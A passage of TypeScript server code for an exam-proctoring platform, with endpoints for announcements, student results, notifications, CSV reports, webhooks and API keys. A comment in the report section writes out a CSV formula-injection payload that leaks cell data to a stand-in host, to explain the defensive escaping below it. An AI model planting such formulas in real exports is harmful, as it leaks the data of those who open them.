    message: String(message).trim(),
    audience: aud as "everyone" | "students" | "instructors" | "admins",
    priority: (["normal", "high", "urgent"].includes(priority) ? priority : "normal") as "normal" | "high" | "urgent",
    channels: chans as ("in_app" | "email" | "sms" | "whatsapp")[],
    status,
    scheduledFor: scheduledFor || null,
    createdAt: now(),
    sentAt: status === "sent" ? now() : null,
    emailedCount,
    createdBy: user.id,
    pinned: !!pinned,
    department: typeof department === "string" ? department.trim().slice(0, 80) : undefined,
  };
  db.data!.announcements.push(ann);
  await db.upsert("announcements", ann);
  await recordAudit(req, "announcement.created", `${ann.title} → ${ann.audience} (${ann.status})`);
  res.json({ announcement: ann, emailedCount });
});

app.delete("/api/admin/announcements/:id", requireRole("admin"), async (req, res) => {
  db.data!.announcements = db.data!.announcements.filter((a) => a.id !== req.params.id);
  await db.remove("announcements", String(req.params.id));
  res.json({ ok: true });
});

// ---------------------------------------------------------------- STUDENT PORTAL (self-service)
app.post("/api/me/password", requireAuth, validate(passwordChangeSchema), async (req, res) => {
  const user = currentUser(req)!;
  // Candidates can't change their own password at all — it's administrator-managed
  // (prevents account hand-off and keeps identity stable for proctoring).
  if (user.role === "candidate") return res.status(403).json({ error: "Password changes are managed by your administrator." });
  // Staff can't change their password mid-exam either (defensive; staff rarely sit exams).
  const activeAttempt = db.data!.attempts.find((a) => a.candidateId === user.id && a.status === "in_progress");
  if (activeAttempt) return res.status(409).json({ error: "You can't change your password while an exam is in progress." });
  const { current, password } = req.body ?? {};
  if (!password || String(password).length < 12) return res.status(400).json({ error: "New password must be at least 12 characters." });
  if (!current || !(await bcrypt.compare(String(current), user.passwordHash))) return res.status(400).json({ error: "Current password is incorrect." });
  user.passwordHash = await bcrypt.hash(String(password), 10);
  user.tokenVersion = (user.tokenVersion ?? 0) + 1; // revoke other sessions on password change
  await db.upsert("users", user);
  issueSession(res, user); // keep the caller signed in with a token at the new version
  res.json({ ok: true });
});

// Self-service account profile (name, contact, avatar, notification prefs).
app.patch("/api/me/profile", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const b = req.body ?? {};
  if (typeof b.name === "string" && b.name.trim()) user.name = b.name.trim().slice(0, 120);
  if (typeof b.phone === "string") { const p = b.phone.trim().slice(0, 40); user.phone = p ? encryptString(p) : undefined; }
  if (typeof b.gender === "string") user.gender = ["male", "female", "other", ""].includes(b.gender.toLowerCase()) ? (b.gender || undefined) : user.gender;
  if (typeof b.avatarUrl === "string") {
    // Accept a small data-URL image, or empty string to clear it.
    if (b.avatarUrl === "") user.avatarUrl = undefined;
    else if (b.avatarUrl.startsWith("data:image/") && b.avatarUrl.length <= 400_000) user.avatarUrl = encryptString(b.avatarUrl);
  }
  if (b.notificationPrefs && typeof b.notificationPrefs === "object") {
    user.notificationPrefs = {
      announcements: !!b.notificationPrefs.announcements,
      results: !!b.notificationPrefs.results,
      reminders: !!b.notificationPrefs.reminders,
    };
  }
  await db.upsert("users", user);
  res.json({ user: toSafeUser(user) });
});

const examById = (id: string) => db.data!.exams.find((e) => e.id === id);

app.get("/api/my/results", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const mine = db.data!.attempts.filter((a) => a.candidateId === user.id && a.status === "submitted" && !examById(a.examId)?.practice);
  const evMap = await proctorStore.forAttempts(mine.map((a) => a.id));
  const results = mine
    .map((a) => {
      const exam = examById(a.examId);
      const cert = db.data!.certificates.find((c) => c.attemptId === a.id);
      const held = !!exam?.resultsReleaseAt && new Date(exam.resultsReleaseAt).getTime() > Date.now();
      return {
        attemptId: a.id, examTitle: exam?.title ?? "Examination", examCode: exam?.code ?? "",
        score: held ? null : (a.score ?? 0), passed: held ? null : (a.passed ?? false),
        gradingStatus: a.gradingStatus ?? "auto_graded",
        held, releaseAt: held ? exam?.resultsReleaseAt ?? null : null,
        letter: held ? null : letterFor(a.score ?? 0, exam?.gradeBands),
        submittedAt: a.submittedAt, integrity: scoreOf(cleanEvents(evMap.get(a.id) ?? [], a.submittedAt)), passingScore: exam?.passingScore ?? 0,
        certNumber: cert?.certNumber ?? null,
      };
    })
    .sort((a, b) => (b.submittedAt ?? "").localeCompare(a.submittedAt ?? ""));
  res.json({ results });
});

app.get("/api/my/attendance", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const rows = db.data!.registrations
    .filter((r) => r.candidateId === user.id)
    .map((r) => {
      const exam = examById(r.examId);
      if (exam?.practice) return null;
      const attempt = db.data!.attempts.filter((a) => a.registrationId === r.id).sort((a, b) => b.startedAt.localeCompare(a.startedAt))[0] ?? null;
      return {
        examTitle: exam?.title ?? "Examination", examCode: exam?.code ?? "",
        status: attendanceFor(r, exam), scheduled: r.scheduledStart ?? exam?.availableFrom ?? null,
        checkedInAt: r.checkedInAt ?? null, submittedAt: attempt?.submittedAt ?? null,
      };
    })
    .filter(Boolean)
    .sort((a, b) => (b!.scheduled ?? "").localeCompare(a!.scheduled ?? ""));
  res.json({ attendance: rows });
});

app.get("/api/my/summary", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const myAttempts = db.data!.attempts.filter((a) => a.candidateId === user.id && a.status === "submitted" && !examById(a.examId)?.practice);
  const scores = myAttempts.map((a) => a.score ?? 0);
  const regs = db.data!.registrations.filter((r) => r.candidateId === user.id && !examById(r.examId)?.practice);

  res.json({
    enrolled: regs.length,
    completed: myAttempts.length,
    pending: regs.filter((r) => r.status !== "submitted" && r.approval === "confirmed").length,
    awaitingApproval: regs.filter((r) => r.approval === "pending").length,
    avgScore: scores.length ? Math.round(scores.reduce((p, c) => p + c, 0) / scores.length) : null,
    passed: myAttempts.filter((a) => a.passed).length,
    // Read-only: the streak is earned by sitting exams/practice, not by visiting.
    streak: displayStreak(user.lastActiveDay, user.streak, Date.now()),
  });
});

// The candidate's own monthly average score alongside an anonymized
// institution-wide average for the same months — no other candidate's
// individual data is exposed, just an aggregate.
app.get("/api/my/score-trend", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const monthKey = (iso: string) => iso.slice(0, 7); // "YYYY-MM"
  const submitted = db.data!.attempts.filter((a) => a.status === "submitted" && a.submittedAt && typeof a.score === "number" && !examById(a.examId)?.practice);

  const months: string[] = [];
  const cursor = new Date();
  cursor.setDate(1);
  for (let i = 5; i >= 0; i--) {
    const d = new Date(cursor.getFullYear(), cursor.getMonth() - i, 1);
    months.push(`${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}`);
  }

  const trend = months.map((key) => {
    const inMonth = submitted.filter((a) => monthKey(a.submittedAt!) === key);
    const mine = inMonth.filter((a) => a.candidateId === user.id);
    const avg = (rows: typeof inMonth) => rows.length ? Math.round(rows.reduce((s, a) => s + (a.score ?? 0), 0) / rows.length) : null;
    const label = new Date(`${key}-01`).toLocaleDateString(undefined, { month: "short" });
    return { month: label, myScore: avg(mine), classAvg: avg(inMonth) };
  });

  res.json({ trend });
});

app.get("/api/practice", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const practiceExams = db.data!.exams.filter((e) => e.status === "published" && e.practice);
  const items: Array<{ exam: { id: string; title: string; code: string; description: string; durationMinutes: number; questionCount: number }; registrationId: string; lastScore: number | null }> = [];
  for (const exam of practiceExams) {
    let reg = db.data!.registrations.find((r) => r.candidateId === user.id && r.examId === exam.id);
    if (!reg) {
      reg = { id: nanoid(10), examId: exam.id, candidateId: user.id, status: "registered", approval: "confirmed", scheduledStart: null, systemCheckPassed: true, createdAt: now() };
      db.data!.registrations.push(reg);
      await db.upsert("registrations", reg);
    }
    const attempt = db.data!.attempts.filter((a) => a.registrationId === reg!.id).sort((a, b) => b.startedAt.localeCompare(a.startedAt))[0] ?? null;
    items.push({
      exam: { id: exam.id, title: exam.title, code: exam.code, description: exam.description, durationMinutes: exam.durationMinutes, questionCount: db.data!.questions.filter((q) => q.examId === exam.id).length },
      registrationId: reg.id,
      lastScore: attempt?.status === "submitted" ? (attempt.score ?? null) : null,
    });
  }
  res.json({ items });
});

// Candidate-facing: in-app announcements visible to the logged-in user's audience.
app.get("/api/announcements", requireAuth, (req, res) => {
  const u = currentUser(req)!;
  const auds = u.role === "candidate" ? ["everyone", "students"] : ["everyone", "admins"];
  const myReads = new Set(db.data!.announcementReads.filter((r) => r.candidateId === u.id).map((r) => r.announcementId));
  const announcements = db.data!.announcements
    .filter((a) => a.status === "sent" && a.channels.includes("in_app") && auds.includes(a.audience))
    .sort((a, b) => (b.sentAt ?? b.createdAt).localeCompare(a.sentAt ?? a.createdAt))
    .map((a) => ({
      id: a.id, title: a.title, message: a.message, priority: a.priority, sentAt: a.sentAt ?? a.createdAt,
      pinned: !!a.pinned, department: a.department ?? null,
      author: db.data!.users.find((x) => x.id === a.createdBy)?.name ?? "Administration",
      read: myReads.has(a.id),
    }));
  res.json({ announcements });
});

app.post("/api/announcements/:id/read", requireAuth, async (req, res) => {
  const u = currentUser(req)!;
  const id = String(req.params.id);
  if (!db.data!.announcements.some((a) => a.id === id)) return res.status(404).json({ error: "Announcement not found." });
  if (!db.data!.announcementReads.some((r) => r.announcementId === id && r.candidateId === u.id)) {
    const read: AnnouncementRead = { id: nanoid(10), announcementId: id, candidateId: u.id, readAt: now() };
    db.data!.announcementReads.push(read);
    await db.upsert("announcementReads", read);
  }
  res.json({ ok: true });
});

app.post("/api/announcements/read-all", requireAuth, async (req, res) => {
  const u = currentUser(req)!;
  const auds = u.role === "candidate" ? ["everyone", "students"] : ["everyone", "admins"];
  const visible = db.data!.announcements.filter((a) => a.status === "sent" && a.channels.includes("in_app") && auds.includes(a.audience));
  const already = new Set(db.data!.announcementReads.filter((r) => r.candidateId === u.id).map((r) => r.announcementId));
  for (const a of visible) {
    if (already.has(a.id)) continue;
    const read: AnnouncementRead = { id: nanoid(10), announcementId: a.id, candidateId: u.id, readAt: now() };
    db.data!.announcementReads.push(read);
    await db.upsert("announcementReads", read);
  }
  res.json({ ok: true });
});

// Unified notification feed — derived from live data (no stored model). Candidates
// see results, exam reminders and announcements; staff see grading, recent
// submissions and announcements. Read state is tracked on the client.
app.get("/api/notifications", requireAuth, (req, res) => {
  const u = currentUser(req)!;
  const examName = (id: string) => db.data!.exams.find((e) => e.id === id)?.title ?? "Examination";
  const isPractice = (id: string) => !!db.data!.exams.find((e) => e.id === id)?.practice;
  type N = { id: string; type: string; title: string; body: string; at: string; link: string };
  const items: N[] = [];
  const now = Date.now();

  if (u.role === "candidate") {
    for (const a of db.data!.attempts.filter((x) => x.candidateId === u.id && x.status === "submitted" && !isPractice(x.examId))) {
      const title = examName(a.examId);
      if (a.gradingStatus === "pending_review") {
        items.push({ id: `res-${a.id}`, type: "result", title: `${title} — awaiting grading`, body: "Your written answers are being reviewed.", at: a.submittedAt ?? "", link: `/attempts/${a.id}/result` });
      } else {
        items.push({ id: `res-${a.id}`, type: "result", title: `${title} result available`, body: `You scored ${a.score ?? 0}%${a.passed ? " — passed" : ""}.`, at: a.releasedAt ?? a.submittedAt ?? "", link: `/attempts/${a.id}/result` });
      }
    }
    for (const r of db.data!.registrations.filter((x) => x.candidateId === u.id && x.approval === "confirmed" && x.status !== "submitted")) {
      const exam = db.data!.exams.find((e) => e.id === r.examId);
      const iso = r.scheduledStart || exam?.availableFrom;
      if (!iso) continue;
      const t = new Date(iso).getTime();
      if (t > now && t - now < 72 * 3600_000) {
        items.push({ id: `rem-${r.id}`, type: "reminder", title: `${exam?.title ?? "Exam"} starts soon`, body: `Scheduled for ${new Date(iso).toLocaleString()}.`, at: new Date(now).toISOString(), link: `/exams/${r.id}/checkin` });
      }
    }
    for (const a of db.data!.announcements.filter((x) => x.status === "sent" && x.channels.includes("in_app") && ["everyone", "students"].includes(x.audience))) {
      items.push({ id: `ann-${a.id}`, type: "announcement", title: a.title, body: a.message, at: a.sentAt ?? a.createdAt, link: "/announcements" });
    }
    // New/updated library resources the student can see, published in the last 14 days.
    const recentCutoff = now - 14 * 24 * 3600_000;
    for (const b of db.data!.books.filter((x) => x.status === "published" && studentCanSeeBook(x, u))) {
      const at = b.updatedAt ?? b.createdAt;
      if (new Date(at).getTime() > recentCutoff) {
        items.push({ id: `book-${b.id}-${at}`, type: "resource", title: `New library resource: ${b.title}`, body: `${b.resourceType} added to the library.`, at, link: "/library" });
      }
    }
  } else {
    const pending = db.data!.attempts.filter((a) => a.gradingStatus === "pending_review").length;
    if (pending > 0) items.push({ id: "grading", type: "grading", title: `${pending} answer${pending === 1 ? "" : "s"} awaiting grading`, body: "Review and release results.", at: new Date(now).toISOString(), link: "/admin/grading" });
    const dayAgo = now - 24 * 3600_000;
    const recent = db.data!.attempts.filter((a) => a.status === "submitted" && a.submittedAt && new Date(a.submittedAt).getTime() > dayAgo).slice(-20);
    for (const a of recent) {
      items.push({ id: `sub-${a.id}`, type: "submission", title: `New submission · ${examName(a.examId)}`, body: `${db.data!.users.find((x) => x.id === a.candidateId)?.name ?? "A candidate"} submitted.`, at: a.submittedAt ?? "", link: `/admin/attempts/${a.id}` });
    }
    for (const a of db.data!.announcements.filter((x) => x.status === "sent" && x.channels.includes("in_app") && ["everyone", "admins"].includes(x.audience))) {
      items.push({ id: `ann-${a.id}`, type: "announcement", title: a.title, body: a.message, at: a.sentAt ?? a.createdAt, link: "/admin/communication" });
    }
  }

  items.sort((a, b) => (b.at ?? "").localeCompare(a.at ?? ""));
  res.json({ notifications: items.slice(0, 60) });
});

// ---- admin: Integrity — cross-exam proctoring overview ----
app.get("/api/admin/integrity", requireRoles(...GRADERS), async (_req, res) => {
  const submitted = db.data!.attempts.filter((a) => a.status === "submitted");
  const userName = (id: string) => db.data!.users.find((u) => u.id === id)?.name ?? "Candidate";
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);
  const evMap = await proctorStore.forAttempts(submitted.map((a) => a.id));
  const flaggedAll = await proctorStore.allFlagged();

  const perAttempt = submitted.map((a) => {
    const events = evMap.get(a.id) ?? [];
    const flags = events.filter((e) => e.severity !== "info");
    return {
      attemptId: a.id,
      candidate: userName(a.candidateId),
      exam: examOf(a.examId)?.title ?? "Examination",
      integrity: scoreOf(events),
      flags: flags.length,
      highFlags: flags.filter((e) => e.severity === "high").length,
      submittedAt: a.submittedAt,
    };
  });

  // Aggregate event types across every attempt.
  const groups = new Map<string, { type: string; severity: string; count: number }>();
  for (const e of flaggedAll) {
    const g = groups.get(e.type) ?? { type: e.type, severity: e.severity, count: 0 };
    g.count += 1;
    if ((SEVERITY_WEIGHT[e.severity] ?? 0) > (SEVERITY_WEIGHT[g.severity] ?? 0)) g.severity = e.severity;
    groups.set(e.type, g);
  }
  const byType = [...groups.values()].sort((a, b) => b.count - a.count);

  const integrities = perAttempt.map((p) => p.integrity);
  res.json({
    kpis: {
      attempts: submitted.length,
      avgIntegrity: integrities.length ? Math.round(integrities.reduce((p, c) => p + c, 0) / integrities.length) : null,
      totalFlags: perAttempt.reduce((s, p) => s + p.flags, 0),
      highFlags: perAttempt.reduce((s, p) => s + p.highFlags, 0),
      cleanSessions: perAttempt.filter((p) => p.flags === 0).length,
      flaggedSessions: perAttempt.filter((p) => p.flags > 0).length,
    },
    byType,
    flagged: perAttempt.sort((a, b) => a.integrity - b.integrity || b.flags - a.flags),
  });
});

// ---- admin: Reports — summary + CSV exports ----
// Rows include candidate-controlled fields (self-set display name via
// /api/me/profile), so every cell must be defused against CSV/formula
// injection (CWE-1236): a name like `=HYPERLINK("http://evil/leak?"&A2,"x")`
// becomes a live, executing formula the moment an admin opens the export in
// Excel/Sheets/LibreOffice. Cells starting with =, +, -, @, or a tab/CR are
// prefixed with a single quote, which every major spreadsheet app renders as
// literal text instead of evaluating as a formula.
const csvEscape = (v: unknown) => {
  let s = String(v ?? "");
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};
const toCsv = (headers: string[], rows: unknown[][]) =>
  [headers.join(","), ...rows.map((r) => r.map(csvEscape).join(","))].join("\n");

function sendCsv(res: Response, filename: string, csv: string) {
  res.setHeader("Content-Type", "text/csv; charset=utf-8");
  res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
  res.send(csv);
}

/** Build a report's CSV, optionally filtered to a [from, to] date range (YYYY-MM-DD,
 *  inclusive). Shared by the download endpoints and the scheduled-export sweep. */
async function buildReportCsv(key: string, from?: string, to?: string): Promise<{ filename: string; csv: string } | null> {
  const inRange = (iso: string | null | undefined) => {
    if (!from && !to) return true;
    if (!iso) return false;            // undated rows are excluded once a range is set
    if (from && iso < from) return false;
    if (to && iso > to + "T23:59:59.999Z") return false;
    return true;
  };
  const userOf = (id: string) => db.data!.users.find((u) => u.id === id);
  const examOf = (id: string) => db.data!.exams.find((e) => e.id === id);

  if (key === "results") {
    const submitted = db.data!.attempts.filter((a) => a.status === "submitted" && inRange(a.submittedAt));
    const evMap = await proctorStore.forAttempts(submitted.map((a) => a.id));
    const rows = submitted.sort((a, b) => (b.submittedAt ?? "").localeCompare(a.submittedAt ?? "")).map((a) => {
      const u = userOf(a.candidateId); const exam = examOf(a.examId);
      return [u?.name ?? "", u?.email ?? "", exam?.title ?? "", exam?.code ?? "", a.score ?? 0, a.passed ? "Pass" : "Fail",
        scoreOf(cleanEvents(evMap.get(a.id) ?? [], a.submittedAt)), a.gradingStatus ?? "auto_graded", a.submittedAt ?? ""];
    });
    return { filename: "results.csv", csv: toCsv(["Student", "Email", "Exam", "Code", "Score", "Result", "Integrity", "Grading", "Submitted"], rows) };
  }
  if (key === "certificates") {
    const certs = db.data!.certificates.filter((c) => inRange(c.issuedAt)).sort((a, b) => b.issuedAt.localeCompare(a.issuedAt));
    const rows = certs.map((c) => [c.certNumber, userOf(c.candidateId)?.name ?? "", examOf(c.examId)?.title ?? "", c.score, c.issuedAt]);
    return { filename: "certificates.csv", csv: toCsv(["Certificate", "Student", "Exam", "Score", "Issued"], rows) };
  }
  if (key === "students") {
    const evMap = await proctorStore.forAttempts(db.data!.attempts.filter((a) => a.status === "submitted").map((a) => a.id));
    const rows = db.data!.users.filter((u) => u.role === "candidate").map((u) => {
      const attempts = db.data!.attempts.filter((a) => a.candidateId === u.id && a.status === "submitted" && inRange(a.submittedAt));
      const scores = attempts.map((a) => a.score ?? 0);
      const integrities = attempts.map((a) => scoreOf(cleanEvents(evMap.get(a.id) ?? [], a.submittedAt)));
      const last = attempts.map((a) => a.submittedAt).filter(Boolean).sort().pop() ?? "";
      return [u.name, u.email, db.data!.registrations.filter((r) => r.candidateId === u.id).length, attempts.length,
        scores.length ? Math.round(scores.reduce((p, c) => p + c, 0) / scores.length) : "",
        integrities.length ? Math.round(integrities.reduce((p, c) => p + c, 0) / integrities.length) : "",
        db.data!.certificates.filter((c) => c.candidateId === u.id).length, last];
    });
    return { filename: "students.csv", csv: toCsv(["Student", "Email", "Enrolled", "Completed", "AvgScore", "AvgIntegrity", "Certificates", "LastActivity"], rows) };
  }
  return null;
}

const REPORT_TITLES: Record<string, string> = { results: "Results report", students: "Student roster", certificates: "Certificate register" };

app.get("/api/admin/reports", requireRoles(...GRADERS), (_req, res) => {
  const submitted = db.data!.attempts.filter((a) => a.status === "submitted");
  res.json({
    summary: {
      students: db.data!.users.filter((u) => u.role === "candidate").length,
      exams: db.data!.exams.length,
      attempts: submitted.length,
      certificates: db.data!.certificates.length,
    },
    reports: [
      { key: "results", title: "Results report", desc: "Every completed attempt with score, result, and integrity.", rows: submitted.length },
      { key: "students", title: "Student roster", desc: "All students with enrolment and performance aggregates.", rows: db.data!.users.filter((u) => u.role === "candidate").length },
      { key: "certificates", title: "Certificate register", desc: "All issued certificates for verification and records.", rows: db.data!.certificates.length },
    ],
    scheduled: (getSettings().scheduledReports ?? []).map((s) => ({ ...s, title: REPORT_TITLES[s.reportKey] ?? s.reportKey })),
  });
});

const reportCsvHandler = (key: string) => async (req: Request, res: Response) => {
  const from = typeof req.query.from === "string" ? req.query.from : undefined;
  const to = typeof req.query.to === "string" ? req.query.to : undefined;
  const out = await buildReportCsv(key, from, to);
  if (!out) return res.status(404).json({ error: "Unknown report." });
  sendCsv(res, out.filename, out.csv);
};
app.get("/api/admin/reports/results.csv", requireRoles(...GRADERS), reportCsvHandler("results"));
app.get("/api/admin/reports/students.csv", requireRoles(...GRADERS), reportCsvHandler("students"));
app.get("/api/admin/reports/certificates.csv", requireRoles(...GRADERS), reportCsvHandler("certificates"));

// ---- admin: scheduled report exports ----
app.post("/api/admin/reports/schedule", requireRole("admin"), async (req, res) => {
  const b = req.body ?? {};
  const reportKey = b.reportKey;
  if (reportKey !== "results" && reportKey !== "students" && reportKey !== "certificates") return res.status(400).json({ error: "Pick a report." });
  const frequency = b.frequency === "daily" ? "daily" : "weekly";
  const recipients = Array.isArray(b.recipients) ? b.recipients.map((r: unknown) => String(r).trim()).filter(Boolean) : [];
  if (recipients.length === 0) return res.status(400).json({ error: "Add at least one recipient email." });
  const s = getSettings();
  s.scheduledReports = [...(s.scheduledReports ?? []), { id: nanoid(10), reportKey, frequency, recipients, lastSentAt: null }];
  await db.upsert("settings", s);
  await recordAudit(req, "report.scheduled", `${reportKey} · ${frequency} → ${recipients.join(", ")}`);
  res.json({ scheduled: s.scheduledReports });
});
app.delete("/api/admin/reports/schedule/:id", requireRole("admin"), async (req, res) => {
  const s = getSettings();
  s.scheduledReports = (s.scheduledReports ?? []).filter((x) => x.id !== req.params.id);
  await db.upsert("settings", s);
  res.json({ scheduled: s.scheduledReports });
});

/** Periodic sweep: email each due scheduled report (the trailing period's range) to its recipients. */
async function reportSweep() {
  const s = getSettings();
  const list = s.scheduledReports ?? [];
  if (list.length === 0) return;
  let changed = false;
  for (const sr of list) {
    const periodMs = sr.frequency === "daily" ? 24 * 3_600_000 : 7 * 24 * 3_600_000;
    const last = sr.lastSentAt ? new Date(sr.lastSentAt).getTime() : 0;
    if (Date.now() - last < periodMs) continue;
    const fromDate = new Date(Date.now() - periodMs).toISOString().slice(0, 10);
    const toDate = new Date().toISOString().slice(0, 10);
    const out = await buildReportCsv(sr.reportKey, fromDate, toDate);
    if (!out) continue;
    const title = REPORT_TITLES[sr.reportKey] ?? sr.reportKey;
    const subject = `Oriole ${sr.frequency} export — ${title} (${fromDate} to ${toDate})`;
    const body = `Your scheduled ${sr.frequency} "${title}" for ${fromDate} to ${toDate} is below as CSV — copy it into a spreadsheet.\n\n${out.csv}\n\n— Oriole`;
    for (const to of sr.recipients) { try { await sendMail(to, subject, body); } catch { /* best-effort */ } }
    sr.lastSentAt = now();
    changed = true;
  }
  if (changed) await db.upsert("settings", s);
}

// ================================================================ INTEGRATIONS: webhooks + public API
function sign(secret: string, body: string): string {
  return "sha256=" + createHmac("sha256", secret).update(body).digest("hex");
}

/** Fire-and-forget: POST a signed JSON payload to every active webhook subscribed to `event`. */
function dispatchWebhook(event: WebhookEvent, data: Record<string, unknown>) {
  const hooks = (getSettings().webhooks ?? []).filter((w) => w.active && w.events.includes(event));
  if (hooks.length === 0) return;
  const body = JSON.stringify({ event, at: now(), data });
  void Promise.all(hooks.map(async (w) => {
    if (!(await assertSafeWebhookUrl(w.url))) { w.lastStatus = 0; w.lastAt = now(); return; }
    try {
      const res = await fetch(w.url, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-orcalis-event": event, "x-orcalis-signature": sign(decryptString(w.secret) ?? w.secret, body) },
        body,
        signal: AbortSignal.timeout(8000),
      });
      w.lastStatus = res.status;
    } catch { w.lastStatus = 0; }
    w.lastAt = now();
  })).then(() => db.upsert("settings", getSettings())).catch(() => { /* best-effort */ });
}

app.get("/api/admin/integrations", requireRole("admin"), (_req, res) => {
  const s = getSettings();
  res.json({
    events: WEBHOOK_EVENTS,
    webhooks: (s.webhooks ?? []).map((w) => ({ ...w, secret: decryptString(w.secret) ?? w.secret })),
    apiKeys: (s.apiKeys ?? []).map((k) => ({ id: k.id, name: k.name, prefix: k.prefix, createdAt: k.createdAt, lastUsedAt: k.lastUsedAt ?? null })),
  });
});
app.post("/api/admin/webhooks", requireRole("admin"), async (req, res) => {
  const url = String(req.body?.url ?? "").trim();
  if (!(await assertSafeWebhookUrl(url))) return res.status(400).json({ error: "Enter a valid public https:// URL — private, loopback, and link-local addresses are blocked." });
  const events = Array.isArray(req.body?.events) ? (req.body.events as unknown[]).filter((e): e is WebhookEvent => WEBHOOK_EVENTS.includes(e as WebhookEvent)) : [];
  if (events.length === 0) return res.status(400).json({ error: "Pick at least one event." });
  const s = getSettings();
  const rawSecret = "whsec_" + randomBytes(18).toString("hex");
  const hook = { id: nanoid(10), url, events, secret: encryptString(rawSecret), active: true, createdAt: now(), lastStatus: null as number | null, lastAt: null as string | null };
  s.webhooks = [...(s.webhooks ?? []), hook];
  await db.upsert("settings", s);
  await recordAudit(req, "webhook.created", url);
  res.json({ webhook: { ...hook, secret: rawSecret } });
});
app.patch("/api/admin/webhooks/:id", requireRole("admin"), async (req, res) => {
  const s = getSettings();
  const w = (s.webhooks ?? []).find((x) => x.id === req.params.id);
  if (!w) return res.status(404).json({ error: "Webhook not found." });
  if (typeof req.body?.active === "boolean") w.active = req.body.active;
  if (Array.isArray(req.body?.events)) w.events = (req.body.events as unknown[]).filter((e): e is WebhookEvent => WEBHOOK_EVENTS.includes(e as WebhookEvent));
  if (typeof req.body?.url === "string") {
    const newUrl = req.body.url.trim();
    if (!(await assertSafeWebhookUrl(newUrl))) return res.status(400).json({ error: "Enter a valid public https:// URL — private, loopback, and link-local addresses are blocked." });
    w.url = newUrl;
  }
  await db.upsert("settings", s);
  res.json({ webhook: { ...w, secret: decryptString(w.secret) ?? w.secret } });
});
app.delete("/api/admin/webhooks/:id", requireRole("admin"), async (req, res) => {
  const s = getSettings();
  s.webhooks = (s.webhooks ?? []).filter((x) => x.id !== req.params.id);
  await db.upsert("settings", s);
  res.json({ ok: true });
});
app.post("/api/admin/webhooks/:id/test", requireRole("admin"), (req, res) => {
  const w = (getSettings().webhooks ?? []).find((x) => x.id === req.params.id);
  if (!w) return res.status(404).json({ error: "Webhook not found." });
  dispatchWebhook((w.events[0] as WebhookEvent) || "exam.published", { test: true, message: "Test ping from Oriole." });
  res.json({ ok: true });
});

app.post("/api/admin/apikeys", requireRole("admin"), async (req, res) => {
  const name = String(req.body?.name ?? "").trim() || "API key";
  const raw = "ok_live_" + randomBytes(24).toString("hex");
  const rec = { id: nanoid(10), name, prefix: raw.slice(0, 16), keyHash: createHash("sha256").update(raw).digest("hex"), createdAt: now(), lastUsedAt: null as string | null };
  const s = getSettings();
  s.apiKeys = [...(s.apiKeys ?? []), rec];
  await db.upsert("settings", s);
  await recordAudit(req, "apikey.created", name);
  res.json({ key: raw, record: { id: rec.id, name: rec.name, prefix: rec.prefix, createdAt: rec.createdAt } }); // raw key shown ONCE
});
app.delete("/api/admin/apikeys/:id", requireRole("admin"), async (req, res) => {
  const s = getSettings();
  s.apiKeys = (s.apiKeys ?? []).filter((k) => k.id !== req.params.id);
  await db.upsert("settings", s);
  res.json({ ok: true });
});

// Public read-only API (v1), authenticated by a Bearer API key.
function requireApiKey(req: Request, res: Response, next: () => void) {
  const m = String(req.headers.authorization ?? "").match(/^Bearer\s+(.+)$/i);
  if (!m) return res.status(401).json({ error: "Missing API key. Use 'Authorization: Bearer <key>'." });
  const hash = createHash("sha256").update(m[1].trim()).digest("hex");
  const key = (getSettings().apiKeys ?? []).find((k) => k.keyHash === hash);
  if (!key) return res.status(401).json({ error: "Invalid API key." });
  key.lastUsedAt = now();
  void db.upsert("settings", getSettings());
  next();
}
app.get("/api/v1/exams", requireApiKey, (_req, res) => {
  res.json({ exams: db.data!.exams.filter((e) => e.status === "published").map((e) => ({ id: e.id, title: e.title, code: e.code, subject: e.subject ?? null, passingScore: e.passingScore, durationMinutes: e.durationMinutes })) });
});
app.get("/api/v1/results", requireApiKey, (_req, res) => {
  res.json({ results: db.data!.attempts.filter((a) => a.status === "submitted").map((a) => ({ attemptId: a.id, examId: a.examId, candidateId: a.candidateId, score: a.score, passed: a.passed, gradingStatus: a.gradingStatus ?? "auto_graded", submittedAt: a.submittedAt })) });
});
app.get("/api/v1/certificates", requireApiKey, (_req, res) => {
  res.json({ certificates: db.data!.certificates.map((c) => ({ certNumber: c.certNumber, candidateId: c.candidateId, examId: c.examId, score: c.score, issuedAt: c.issuedAt })) });
});

// ---- admin: Organization / Settings ----
app.get("/api/admin/settings", requireRole("admin"), (_req, res) => res.json({ settings: getSettings() }));

app.patch("/api/admin/settings", requireRole("admin"), async (req, res) => {
  const s = getSettings();
  const b = req.body ?? {};
  if (typeof b.name === "string") s.name = b.name.trim() || s.name;
  if (typeof b.supportEmail === "string") s.supportEmail = b.supportEmail.trim();
  if (typeof b.website === "string") s.website = b.website.trim();
  if (typeof b.timezone === "string") s.timezone = b.timezone.trim();
  if (typeof b.defaultPassingScore === "number") s.defaultPassingScore = Math.min(100, Math.max(0, Math.round(b.defaultPassingScore)));
  if (typeof b.defaultProctored === "boolean") s.defaultProctored = b.defaultProctored;
  if (typeof b.autoConfirmEnrollment === "boolean") s.autoConfirmEnrollment = b.autoConfirmEnrollment;
  if (typeof b.type === "string") s.type = b.type;
  if (typeof b.accreditation === "string") s.accreditation = b.accreditation.trim();
  if (typeof b.phone === "string") s.phone = b.phone.trim();
  if (typeof b.address === "string") s.address = b.address.trim();
  if (b.digestFrequency === "off" || b.digestFrequency === "daily" || b.digestFrequency === "weekly") s.digestFrequency = b.digestFrequency;
  if (typeof b.auditRetentionDays === "number") s.auditRetentionDays = Math.max(0, Math.min(3650, Math.floor(b.auditRetentionDays)));
  if (typeof b.smsReminders === "boolean") s.smsReminders = b.smsReminders;
  if (b.learningStructure && typeof b.learningStructure === "object") {
    const ls = b.learningStructure as Record<string, unknown>;
    const current = s.learningStructure ?? DEFAULT_LEARNING_STRUCTURE;
